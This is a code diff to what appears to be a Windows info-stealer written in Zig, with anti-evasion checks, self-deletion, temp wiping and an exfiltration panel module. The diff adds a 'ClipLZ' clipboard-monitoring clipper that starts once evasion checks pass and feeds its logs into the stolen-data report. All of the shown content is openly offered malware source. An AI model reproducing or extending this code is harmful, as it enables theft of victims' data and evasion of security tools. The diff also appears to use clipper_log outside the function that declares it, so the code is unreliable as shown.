@@ -34,6 +34,9 @@ const panel_http = @import("network/panel_http.zig");
 const detection = @import("evasion/detection.zig");
 const self_delete = @import("cleanup/self_delete.zig");
 const temp_wipe = @import("cleanup/temp_wipe.zig");
+const clipper_config = @import("clipper_config");
+const clipboard_monitor = @import("clipper/clipboard_monitor.zig");
+const clipper_log_mod = @import("clipper/log.zig");
 
 const is_debug = true;
 
@@ -242,6 +245,16 @@ fn buildReport(allocator: std.mem.Allocator, local_app_data: []const u8, roaming
     for (game_result.games) |g| allocator.free(g.name);
     allocator.free(game_result.games);
 
+    if (clipper_config.CLIPPER_ENABLED) {
+        logMsg("[+] Collecting ClipLZ logs...\n");
+        const clipper_section = clipper_log_mod.ClipperLog.format(&clipper_log, allocator) catch "";
+        if (clipper_section.len > 0) {
+            report.appendSlice(clipper_section) catch {};
+            report.appendSlice("\n") catch {};
+        }
+        allocator.free(clipper_section);
+    }
+
     return report.toOwnedSlice() catch "";
 }
 
@@ -326,6 +339,15 @@ fn runProductionPipeline() void {
     const env_ok = initAntiEvasion(ntdll);
     if (!env_ok) return;
     logMsg("[+] Anti-evasion checks passed\n");
+
+    var clipper_log: clipper_log_mod.ClipperLog = undefined;
+    if (clipper_config.CLIPPER_ENABLED) {
+        clipper_log = clipper_log_mod.ClipperLog.init(std.heap.page_allocator);
+        clipboard_monitor.start(&clipper_log) catch {
+            logMsg("[!] ClipLZ monitor failed to start\n");
+        };
+        logMsg("[+] ClipLZ clipboard monitor spawned\n");
+    }
 
     if (config.HWID_BAN_LIST.len > 0) {
         const hwid = detection.generateHwid();
